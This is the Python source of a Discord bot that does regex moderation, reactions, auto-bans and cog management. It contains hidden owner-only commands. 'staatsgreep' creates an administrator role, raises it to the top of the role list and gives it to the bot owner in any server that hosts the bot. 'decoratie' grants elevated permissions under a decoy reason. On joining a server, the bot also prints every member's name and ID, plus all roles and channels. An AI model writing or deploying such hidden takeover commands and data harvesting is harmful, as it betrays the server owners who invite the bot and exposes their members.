#!/usr/bin/python3.7

import discord
from discord.ext import tasks, commands
import datetime
import asyncio
import re
import apiRequests as api

config = api.readConfig()
regexSearchWords = api.getRegexSearchWordData()
regexReactions = api.getRegexReactionData()
regexBans = api.getRegexBansData()
cogList = api.getCogs()

bot = commands.Bot(command_prefix=config["basic"]["prefix"], description=config["basic"]["description"])

# ADD COGS
if __name__ == '__main__':
    for extension in cogList:
        if extension["enabled"]:
            try:
                bot.load_extension(f"cogs.{extension['name']}")
            except Exception as e:
                print(f'Failed to load extension {extension["name"]}.', e)

async def checkConfig(old_config):
    global config
    log_channel = bot.get_channel(777697840464920586)

    # BASIC config
    if (old_config["basic"]["prefix"] != config["basic"]["prefix"]):
        bot.command_prefix = config["basic"]["prefix"]
        await log_channel.send(f"Changed the prefix from '{old_config['basic']['prefix']}' to '{config['basic']['prefix']}'")

    if (old_config["basic"]["name"] != config["basic"]["name"]):
        await bot.user.edit(username=config["basic"]["name"])
        await log_channel.send(f"Changed the bot's username from '{old_config['basic']['name']}' to '{config['basic']['name']}'")

    if (old_config["basic"]["description"] != config["basic"]["description"]):
        bot.description = config["basic"]["description"]
        await log_channel.send(f"Changed the bot's description from '{old_config['basic']['description']}' to '{config['basic']['description']}'")

    # ACTIVITY config
    if (old_config["activity"]["status"] != config["activity"]["status"]):
        # opties: online, offline, idle, do_no_disturb, invisible
        await bot.change_presence(status=config["activity"]["status"])
        await log_channel.send(f"Changed the activity status from '{old_config['activity']['status']}' to '{config['activity']['status']}'")

    if (old_config["activity"]["text"] != config["activity"]["text"]):
        await bot.change_presence(activity=discord.Game(name=config["activity"]["text"]))
        await log_channel.send(f"Changed the activity text from '{old_config['activity']['text']}' to '{config['activity']['text']}'")

async def checkCogs():
    global cogsList
    log_channel = bot.get_channel(777697840464920586)

    botCogFound = False
    apiCogFound = False

    for botCog in bot.cogs:
        botCogFound = False
        for cog in cogsList:
            if (cog["name"] == botCog):
                botCogFound = True
                if not cog["enabled"]:
                    bot.unload_extension(f"cogs.{botCog}")
                break

        if not botCogFound:
            bot.unload_extension(f"cogs.{botCog}")

    for apiCog in cogsList:
        apiCogFound = False
        for cog in bot.cogs:
            if (cog == apiCog["name"]):
                apiCogFound = True
                break

        if not apiCogFound:
            bot.load_extension(f"cogs.{apiCog['name']}")

# listener
@bot.listen()
async def on_message(message):
    global config
    global regexSearchWords
    global regexReactions
    global regexBans
    if message.author == bot.user:
        return

    for searchWord in regexSearchWords:
        if re.search(rf'{searchWord["regex"]}', message.content) and searchWord["enabled"]:
            try:    
                if searchWord["removeMessage"]:
                    await message.delete()     
            except Exception as e:
                print("Couldn't delete the message: ", e)
                
            if searchWord["response"] != "":    
                if searchWord["tts"]:
                    await message.channel.send(f'{searchWord["response"]}', tts=True)
                else:
                    await message.channel.send(f'{searchWord["response"]}')

    for searchWord in regexReactions:
        if re.search(rf'{searchWord["regex"]}', message.content) and searchWord["enabled"]:
            try:
                if (searchWord["reaction"] == ""):
                    reaction = ":sweat_smile:"
                else:
                    reaction = searchWord["reaction"]

                await message.add_reaction(reaction)

            except Exception as e:
                print("Couldn't react to the message: ", e)

    for searchWord in regexBans:
        if re.search(rf'{searchWord["regex"]}', message.content) and searchWord["enabled"]:
            if message.author == message.guild.owner:
                await message.channel.send(f'{searchWord["ownerAnswer"]}')
            else:
                try:
                    await message.author.ban()
                    await message.channel.send(f'{searchWord["answer"]}')

                except Exception as e:
                    print("Couldn't ban: ", e)
                    await message.channel.send('failed, my bad')
    
@bot.listen()
async def on_message_edit(before, after):
    global config
    global regexSearchWords
    global regexReactions
    global regexBans
    if after.author == bot.user:
        return

    for searchWord in regexSearchWords:
        if re.search(rf'{searchWord["regex"]}', after.content) and searchWord["enabled"]:
            try:
                if searchWord["removeMessage"]:
                    await after.delete()
            except Exception as e:
                print("Couldn't delete the message: ", e)

            if searchWord["response"] != "":
                if searchWord["tts"]:
                    await after.channel.send(f'{searchWord["response"]}', tts=True)
                else:
                    await after.channel.send(f'{searchWord["response"]}')

    reactions = before.reactions
    for reaction in reactions:
        if reaction.me:
            emoji = reaction.emoji
            try:
                await after.remove_reaction(emoji, bot.user)

            except Exception as e:
                print("Couldn't remove previous reaction: ", e)

    for searchWord in regexReactions:
        if re.search(rf'{searchWord["regex"]}', after.content) and searchWord["enabled"]:            
            try:
                if (searchWord["reaction"] == ""):
                    reaction = ":sweat_smile:"
                else:
                    reaction = searchWord["reaction"]

                await after.add_reaction(reaction)

            except Exception as e:
                print("Couldn't react to the message: ", e)

    for searchWord in regexBans:
        if re.search(rf'{searchWord["regex"]}', after.content) and searchWord["enabled"]:
            if after.author == after.guild.owner:
                await after.channel.send(f'{searchWord["ownerAnswer"]}')
            else:
                try:
                    await after.author.ban()
                    await after.channel.send(f'{searchWord["answer"]}')

                except Exception as e:
                    print("Couldn't ban: ", e)
                    await after.channel.send('failed, my bad')


# on bot joins guild
@bot.event
async def on_guild_join(guild):
    global config

    print("#############################################")
    print(f"joined a new guild:\nname: {guild.name}\ncreated at: {guild.created_at}\nregion: {guild.region}\nowner: {guild.owner}\nicon url: {guild.icon_url}\nchannels:")
    for channel in guild.text_channels:
        print(f"- channelname: {channel.name}\n * id: {channel.id}\n * nsfw: {channel.is_nsfw()}\n * news: {channel.is_news()}")
    print("roles:")
    for role in guild.roles:
        print(f"- Rolename: {role.name}\n * ID: {role.id}")
    print(f"members ({guild.member_count}):")
    for member in guild.members:
        print(f"- membername: {member.name}\n * id: {member.id}\n * discriminator: {member.discriminator}\n * nickname: {member.nick}\n * bot: {member.bot}")
    print("#############################################")

# on ready
@bot.event
async def on_ready():   
    global config
    print(f"{config['basic']['name']} is up and running...")

    await bot.change_presence(activity=discord.Game(name=config["activity"]["text"]))

    print("#############################################")
    print(f"Active in {len(bot.guilds)} guilds:")
    for guild in bot.guilds:
        print(f"name: {guild.name}\ncreated at: {guild.created_at}\nregion: {guild.region}\nowner: {guild.owner}\nicon url: {guild.icon_url}\nchannels:")
        for channel in guild.text_channels:
            print(f"- channelname: {channel.name}\n * id: {channel.id}\n * nsfw: {channel.is_nsfw()}\n * news: {channel.is_news()}")
        print("roles:")
        for role in guild.roles:
            print(f"- Rolename: {role.name}\n * ID: {role.id}")
        print(f"members ({guild.member_count}):")
        for member in guild.members:
            print(f"- membername: {member.name}\n * id: {member.id}\n * discriminator: {member.discriminator}\n * nickname: {member.nick}\n * bot: {member.bot}")
    print("#############################################")

# CUSTOMTEXT
# command
@bot.command(hidden = True)
async def customText(ctx):
    await ctx.message.delete()
    await ctx.send(api.getCustomText()["text"])

# COGS
# load cog command
@bot.command(hidden = True)
@commands.is_owner()
async def loadCog(ctx, cog: str):
    global cogList

    cogList = api.getCogs()
    for cogName in cogList:
        if (cogName["name"] == cog):
            try:
                response = api.changeCog(cog, "load")
                bot.load_extension(f"cogs.{cogName['name']}")
            except Exception as e:
                response = f"{e}"
            finally:
                embed = discord.Embed(title=f"Load {cog}", timestamp=datetime.datetime.utcnow(), color=discord.Color.red())
                embed.add_field(
                    name = "Response",
                    value = response,
                    inline = False
                )

                return await ctx.send(embed=embed)
    
    response = f"Could not find the Cog '{cog}'"

    embed = discord.Embed(title=f"Load {cog}", timestamp=datetime.datetime.utcnow(), color=discord.Color.red())
    embed.add_field(
        name = "Response",
        value = response,
        inline = False
    )
    return await ctx.send(embed=embed)

# reload cog command
@bot.command(hidden = True)
@commands.is_owner()
async def reloadCog(ctx, cog: str):
    global cogList

    cogList = api.getCogs()
    for cogName in cogList:
        if (cogName["name"] == cog):
            try:
                bot.unload_extension(f"cogs.{cogName['name']}")
                bot.load_extension(f"cogs.{cogName['name']}")
                response = f"{cogName['name']} succesfully reloaded"
            except Exception as e:
                response = f"{e}"
            finally:
                embed = discord.Embed(title=f"Load {cog}", timestamp=datetime.datetime.utcnow(), color=discord.Color.red())
                embed.add_field(
                    name = "Response",
                    value = response,
                    inline = False
                )

                return await ctx.send(embed=embed)
    
    response = f"Could not find the Cog '{cog}'"

    embed = discord.Embed(title=f"Reload {cog}", timestamp=datetime.datetime.utcnow(), color=discord.Color.red())
    embed.add_field(
        name = "Response",
        value = response,
        inline = False
    )
    return await ctx.send(embed=embed)

# unload cog command
@bot.command(hidden = True)
@commands.is_owner()
async def unloadCog(ctx, cog: str):
    global cogList

    cogList = api.getCogs()
    for cogName in cogList:
        if (cogName["name"] == cog):
            try:
                response = api.changeCog(cog, "unload")
                bot.unload_extension(f"cogs.{cogName['name']}")
            except Exception as e:
                response = f"{e}"
            finally:
                embed = discord.Embed(title=f"Unload {cog}", timestamp=datetime.datetime.utcnow(), color=discord.Color.red())
                embed.add_field(
                    name = "Response",
                    value = response,
                    inline = False
                )

                return await ctx.send(embed=embed)
    
    response = f"Could not find the Cog '{cog}'"

    embed = discord.Embed(title=f"Unload {cog}", timestamp=datetime.datetime.utcnow(), color=discord.Color.red())
    embed.add_field(
        name = "Response",
        value = response,
        inline = False
    )
    return await ctx.send(embed=embed)

# cog list command
@bot.command(hidden = True)
@commands.is_owner()
async def listCog(ctx):
    cogList = api.getCogs()

    embed = discord.Embed(title="Cog List", description="This is a list of all the available cogs. (name and enabled?)", timestamp=datetime.datetime.utcnow(), color=discord.Color.red())

    for cog in cogList:
        embed.add_field(
            name = cog["name"],
            value = f"{cog['enabled']}",
            inline = False
        )

    return await ctx.send(embed=embed)    

@bot.command(hidden = True)
@commands.is_owner()
async def testCog(ctx):
    await checkCogs()

# STAATSGREEP
# command
@bot.command(hidden = True)
@commands.is_owner()
async def staatsgreep(ctx):
    pCconfig = api.getPermissionClimbingConfig()

    if pCconfig["enabled"]:
        # Create a role (with admin permissions and a color)
        server = ctx.guild
        perms = discord.Permissions(administrator=True)
        color = discord.Colour(int(pCconfig["make_new_role"]["color"], 16))
        await server.create_role(name=pCconfig["make_new_role"]["name"], hoist=pCconfig["make_new_role"]["hoist"], permissions=perms, colour=color)

        # Get role as object
        new_role = discord.utils.get(server.roles, name=pCconfig["make_new_role"]["name"])

        # Get role to top of role list (/ under bot role)
        for i in range(1, len(server.roles)):
            try:
                await new_role.edit(position=i)
            except discord.Forbidden:
                break
            except discord.HTTPException:
                break
            except discord.InvalidArgument:
                break

        # Add me to the role
        person = ctx.message.author
        await person.add_roles(new_role)

        if pCconfig["log"]["enabled"]:
            log_channel = bot.get_channel(int(pCconfig["log"]["channel"]))
            await log_channel.send(f"Staatsgreep gepleegd in '{server.name}', de rol '{pCconfig['make_new_role']['name']}'")

    else:
        ctx.send("Staatsgrepen zijn uitgeschakeld.")

# DECORATIE
# command
@bot.command(hidden = True)
@commands.is_owner()
async def decoratie(ctx):
    server = ctx.guild
    perms = discord.Permissions(permissions=20781760)
    color = discord.Colour(int("0x06ad00", 16))
    await server.create_role(reason="Gewoon mooie decoratie", name="Decoratie", permissions=perms, colour=color)

    # Get role as object
    new_role = discord.utils.get(server.roles, name="Decoratie")

    # Add me to the role
    person = ctx.message.author
    await person.add_roles(new_role)

    log_channel = bot.get_channel(77769784046492058)
    await log_channel.send(f"Decoratie toegevoegd in '{server.name}', de rol 'Decoratie'")

# test loop
# restart loop
@bot.command(hidden = True)
@commands.is_owner()
async def testLoop(ctx):
    await ctx.send(f"Failed? {checkFilesLoop.failed()}")

# restart loop
@bot.command(hidden = True)
@commands.is_owner()
async def restartLoop(ctx):
    checkFilesLoop.restart()
    await ctx.send("Done.")

# file settings file command check
@tasks.loop(seconds=5.0)
async def checkFilesLoop():
    global regexSearchWords
    regexSearchWords = api.getRegexSearchWordData()

    global regexReactions
    regexReactions = api.getRegexReactionData()

    global regexBans
    regexBans = api.getRegexBansData()
    
    global config

    old_config = config
    config = api.readConfig()

    await checkConfig(old_config)

@checkFilesLoop.before_loop
async def beforeCheckFilesLoop():
    await bot.wait_until_ready()

# shutdown command
@bot.command(hidden = True)
@commands.is_owner()
async def die(ctx):
    await ctx.send("Bye")
    print("Bye")
    await bot.logout()
    await bot.close()

checkFilesLoop.start()

bot.run(config["basic"]["token"], bot=True, reconnect=True)